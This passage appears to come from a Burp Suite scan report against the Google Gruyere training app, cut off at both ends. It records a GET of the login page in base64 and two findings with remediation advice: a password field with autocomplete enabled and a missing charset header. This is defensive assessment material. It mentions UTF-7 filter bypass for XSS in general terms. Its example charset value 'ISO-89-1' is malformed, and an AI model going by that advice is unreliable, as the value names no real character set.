      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzQ5MjUzYmU0YjJkNTc5OGM4NzhhZGY4ZTUwOWQwNjINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo1OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjk5MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IExvZ2luPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDI+R3J1eWVyZTogTG9naW48L2gyPgo8L2Rpdj4KCgoKPGRpdiBjbGFzcz0nY29udGVudCc+Cjxmb3JtIG1ldGhvZD0nZ2V0JyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4nPgo8dGFibGU+PHRyPjx0ZD4KICAgIFVzZXIgbmFtZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1aWQnPgo8L3RkPjwvdHI+PHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CjwvdGQ+PC90cj48dHI+PHRkPjwvdGQ+PHRkIGFsaWduPSdyaWdodCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPgo8L3RkPjwvdHI+PC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4333361966214144</serialNumber>
    <type>5244928</type>
    <name><![CDATA[Password field with autocomplete enabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.</p>
<p>The stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To prevent browsers from storing credentials entered into HTML forms, include the attribute <b>autocomplete="off"</b> within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).</p>
<p>Please note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/login</li></ul>The form contains the following password field with autocomplete enabled:<ul><li>pw</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[pw]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzQ5MjUzYmU0YjJkNTc5OGM4NzhhZGY4ZTUwOWQwNjINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo1OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjk5MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IExvZ2luPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDI+R3J1eWVyZTogTG9naW48L2gyPgo8L2Rpdj4KCgoKPGRpdiBjbGFzcz0nY29udGVudCc+Cjxmb3JtIG1ldGhvZD0nZ2V0JyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4nPgo8dGFibGU+PHRyPjx0ZD4KICAgIFVzZXIgbmFtZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd1aWQnPgo8L3RkPjwvdHI+PHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CjwvdGQ+PC90cj48dHI+PHRkPjwvdGQ+PHRkIGFsaWduPSdyaWdodCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPgo8L3RkPjwvdHI+PC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>202657674693469184</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/login]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/login]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9naW4gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzQ5MjUzYmU0YjJkNTc5OGM4NzhhZGY4ZTUwOWQwNjINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo1OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjk5MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IExvZ2luPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUB